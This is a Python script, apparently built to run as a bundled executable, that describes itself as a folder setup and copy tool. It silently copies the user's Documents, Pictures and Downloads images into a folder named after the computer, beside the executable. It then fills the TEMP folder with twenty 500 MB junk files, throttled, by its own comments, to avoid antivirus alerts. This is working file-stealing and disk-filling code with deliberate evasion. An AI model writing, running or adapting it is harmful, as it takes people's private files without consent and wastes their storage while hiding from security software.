import os
import shutil
import platform
import concurrent.futures
import sys
import time

# Function to determine the current directory regardless of frozen state.
def get_current_dir():
    if getattr(sys, 'frozen', False):
        # Running as a bundled executable
        return os.path.dirname(sys.executable)
    else:
        # Running as a normal Python script
        return os.path.dirname(os.path.abspath(__file__))

# Threshold for large files (in bytes); 50 MB.
MAX_FILE_SIZE = 50 * 1024 * 1024
# Timeout (in seconds) for each file copy task.
COPY_TIMEOUT = 10
# Allowed image extensions for filtering files in Downloads.
ALLOWED_IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp"}

def image_filter(entry):
    """
    Returns True if the file extension of the entry is one of the allowed image types.
    """
    _, ext = os.path.splitext(entry.name)
    return ext.lower() in ALLOWED_IMAGE_EXTENSIONS

def copy_file_task(task, max_size):
    """
    Copies a single file from src to dst.
    If the file size exceeds max_size, the file is skipped.
    Returns a dictionary with the result.
    """
    src, dst = task
    try:
        file_size = os.path.getsize(src)
        if file_size > max_size:
            return {'status': 'skipped', 'src': src, 'size': file_size}
        shutil.copy2(src, dst)
        return {'status': 'copied', 'src': src}
    except PermissionError:
        return {'status': 'error', 'src': src, 'message': 'Permission denied'}
    except Exception as e:
        return {'status': 'error', 'src': src, 'message': str(e)}

def gather_copy_tasks(src, dst, filter_func=None):
    """
    Recursively gathers file copy tasks from src to dst using os.scandir.
    If filter_func is provided, only files for which filter_func(entry) returns True are added.
    Returns a list of (source_file, destination_file) tuples.
    """
    tasks = []
    def recursive_scan(s, d):
        if not os.path.exists(s):
            print(f"Skipping {s} (not found)")
            return
        os.makedirs(d, exist_ok=True)
        try:
            with os.scandir(s) as entries:
                for entry in entries:
                    if entry.is_file():
                        if filter_func is None or filter_func(entry):
                            tasks.append((entry.path, os.path.join(d, entry.name)))
                    elif entry.is_dir():
                        recursive_scan(entry.path, os.path.join(d, entry.name))
        except PermissionError as e:
            print(f"Permission denied accessing {s}: {e}")
    recursive_scan(src, dst)
    return tasks

def copy_files_concurrently(src_root, dst_root, max_workers=50, filter_func=None):
    """
    Gathers copy tasks from src_root to dst_root and processes them concurrently.
    Each file copy is handled by a single worker.
    Provides detailed progress reporting.
    """
    tasks = gather_copy_tasks(src_root, dst_root, filter_func)
    total = len(tasks)
    if total == 0:
        print(f"No files found to copy from {src_root}")
        return

    print(f"Total files to copy from {src_root}: {total}")
    copied = 0
    skipped = 0
    errors = 0
    processed = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_task = {executor.submit(copy_file_task, task, MAX_FILE_SIZE): task for task in tasks}
        for future in concurrent.futures.as_completed(future_to_task):
            try:
                result = future.result(timeout=COPY_TIMEOUT)
            except concurrent.futures.TimeoutError:
                task = future_to_task[future]
                print(f"\nTimeout copying file: {task[0]}")
                processed += 1
                continue

            processed += 1
            if result['status'] == 'copied':
                copied += 1
            elif result['status'] == 'skipped':
                skipped += 1
                print(f"\nSkipped large file: {result['src']} ({result['size']/(1024*1024):.2f} MB)")
            elif result['status'] == 'error':
                errors += 1
                print(f"\nError copying {result['src']}: {result.get('message','Unknown error')}")
            sys.stdout.write(f"\rProgress: {processed}/{total} | Copied: {copied} | Skipped: {skipped} | Errors: {errors}")
            sys.stdout.flush()
    print(f"\nFinished copying files from {src_root}.")

def create_folder_structure_and_copy():
    """
    Creates a folder structure under lib/<computer-name> with subfolders for:
      - Documents (from the user's Documents)
      - photos (from the user's Pictures)
      - downloads_images (images found in the user's Downloads)
    Then it copies files from the corresponding standard user directories.
    """
    current_dir = get_current_dir()
    lib_dir = os.path.join(current_dir, 'lib')
    os.makedirs(lib_dir, exist_ok=True)
    
    computer_name = platform.node()
    computer_folder = os.path.join(lib_dir, computer_name)
    os.makedirs(computer_folder, exist_ok=True)
    
    dest_folders = {
        "Documents": os.path.join(computer_folder, "Documents"),
        "photos": os.path.join(computer_folder, "photos"),
        "downloads_images": os.path.join(computer_folder, "downloads_images")
    }
    for folder in dest_folders.values():
        os.makedirs(folder, exist_ok=True)
    
    home_dir = os.path.expanduser("~")
    source_dirs = {
        "Documents": os.path.join(home_dir, "Documents"),
        "photos": os.path.join(home_dir, "Pictures"),
        "downloads": os.path.join(home_dir, "Downloads")
    }
    
    print(f"\nCopying files from {source_dirs['Documents']} to {dest_folders['Documents']} ...")
    copy_files_concurrently(source_dirs["Documents"], dest_folders["Documents"])
    
    print(f"\nCopying files from {source_dirs['photos']} to {dest_folders['photos']} ...")
    copy_files_concurrently(source_dirs["photos"], dest_folders["photos"])
    
    print(f"\nCopying image files from {source_dirs['downloads']} to {dest_folders['downloads_images']} ...")
    copy_files_concurrently(source_dirs["downloads"], dest_folders["downloads_images"], filter_func=image_filter)
    
    print("\nFolder structure and file copying completed.")

def create_temp_file(file_path, desired_size, chunk_size, chunk, num_chunks, remainder, base):
    """
    Creates a single file at file_path of size desired_size using precomputed values.
    The file is filled with repeated b"wow" bytes.
    A small delay is added after each chunk to reduce aggressive disk activity.
    """
    with open(file_path, 'wb') as f:
        for _ in range(num_chunks):
            f.write(chunk)
            time.sleep(0.01)  # slight delay to smooth out disk writes
        if remainder:
            rem_repeats = (remainder // len(base)) + 1
            rem_data = (base * rem_repeats)[:remainder]
            f.write(rem_data)
    return file_path

def create_temp_files():
    """
    Creates 20 large files (500 MB each) concurrently in the system's TEMP folder.
    Uses 10 MB chunks for faster creation with reduced concurrency and a small delay
    to reduce heavy disk activity that might trigger antivirus alerts.
    """
    temp_dir = os.getenv("TEMP")
    if not temp_dir:
        print("TEMP environment variable not found. Skipping temp file creation.")
        return

    print(f"\nCreating 20 large files (500 MB each) in {temp_dir} ...")
    desired_size = 500 * 1024 * 1024  # 500 MB in bytes
    chunk_size = 10 * 1024 * 1024       # 10 MB chunk

    base = b"wow"
    repeats = chunk_size // len(base)
    chunk = (base * repeats)[:chunk_size]
    num_chunks = desired_size // chunk_size
    remainder = desired_size % chunk_size

    file_paths = [os.path.join(temp_dir, f"large_file_{i}.txt") for i in range(1, 21)]
    
    # Using 3 workers to reduce simultaneous heavy disk activity.
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        futures = {executor.submit(create_temp_file, fp, desired_size, chunk_size, chunk, num_chunks, remainder, base): fp for fp in file_paths}
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                print(f"Created {result} of size {desired_size/(1024*1024):.2f} MB")
            except Exception as e:
                print(f"Error creating file {futures[future]}: {e}")
    print("20 large files created in the system TEMP folder.")

def main():
    print("Starting folder setup and file copy process...")
    create_folder_structure_and_copy()
    create_temp_files()
    print("All operations completed.")

if __name__ == '__main__':
    main()
